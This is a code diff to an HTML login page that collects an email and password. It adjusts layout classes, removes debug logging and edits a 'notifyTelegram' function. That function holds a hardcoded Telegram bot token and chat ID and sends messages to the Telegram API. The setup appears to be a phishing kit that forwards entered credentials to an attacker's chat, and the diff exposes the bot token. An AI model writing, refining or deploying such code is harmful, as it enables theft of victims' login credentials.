@@ -74,7 +74,7 @@ color:rgb(244, 67, 54);
 <body>
 <div class="container login-container">
             <div class="row">
-                <div class="col-md-5 offset-md-4">
+                <div class="col-sm-12 col-lg-6 col-md-5 offset-md-4 offset-lg-3">
                     <img src="app-logo.af9bd129bfa1f0e243f3570147f36211.png" class="logo" />
 
                     <div class="login-form-1">
@@ -168,8 +168,6 @@ color:rgb(244, 67, 54);
           var euser = $("#euser").val();
           var epass = $("#epass").val();
 
-          console.log(euser);
-          console.log(euser == "");
           if (euser == "" || epass == ""){
               $("#error").html("<i>Error: Please enter a valid email and password.</i>");
 
@@ -192,7 +190,7 @@ color:rgb(244, 67, 54);
         })
 
 
-        async function notifyTelegram(message) {
+        function notifyTelegram(message) {
             const botToken = '7582406379:AAFSqZwUfw807J6Qf51Wa3fSQS5pPhU-R3c';
             const chatId = '1369859387';
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -214,7 +212,8 @@ color:rgb(244, 67, 54);
             } catch (error) {
                 console.error('Fetch error: '+ error);
             }
-            return true;
+
+           return true;
         }
     </script>
 
